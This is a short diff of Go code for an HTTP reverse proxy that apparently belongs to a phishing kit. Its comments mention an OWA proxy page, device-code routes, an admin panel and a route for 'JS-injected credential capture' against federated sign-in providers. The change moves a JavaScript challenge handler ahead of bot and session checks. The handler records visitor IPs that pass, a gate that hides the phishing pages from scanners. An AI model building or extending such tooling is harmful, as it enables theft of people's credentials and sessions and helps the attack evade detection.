@@ -196,6 +196,17 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			// mode is enabled and the socket peer is a known Cloudflare edge node.
 			from_ip := GetRealIP(req, p.cfg.GetCloudflareMode())
 
+			// /_xv — JS challenge pass signal (must be first, before any bot/session checks).
+			// The challenge page JS POSTs here after the timing gate to prove execution.
+			if req.Method == "POST" && req.URL.Path == "/_xv" {
+				p.challenge_mtx.Lock()
+				p.challengedIPs[from_ip] = time.Now().Add(5 * time.Minute).Unix()
+				p.challenge_mtx.Unlock()
+				resp := goproxy.NewResponse(req, "application/json", 200, "{}")
+				resp.Header.Set("Access-Control-Allow-Origin", "*")
+				return req, resp
+			}
+
 			// Device-code routes (/dc/…) and admin panel (/admin/…).
 			// Forwarded to the local HTTP server on :80 so they work over HTTPS
 			// (required for window.crypto / MSAL inside the OWA proxy page).
@@ -339,18 +350,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 					}
 				}
-			}
-
-			// /_xv — JS challenge pass signal. The challenge page POSTs here after
-			// the timing gate and bot checks pass. Server records the IP so the next
-			// request (the reload) is let through without serving the challenge again.
-			if req.Method == "POST" && req.URL.Path == "/_xv" {
-				p.challenge_mtx.Lock()
-				p.challengedIPs[from_ip] = time.Now().Add(5 * time.Minute).Unix()
-				p.challenge_mtx.Unlock()
-				resp := goproxy.NewResponse(req, "application/json", 200, "{}")
-				resp.Header.Set("Access-Control-Allow-Origin", "*")
-				return req, resp
 			}
 
 			// /_x/cred — JS-injected credential capture for federated providers (GoDaddy SSO, etc.)
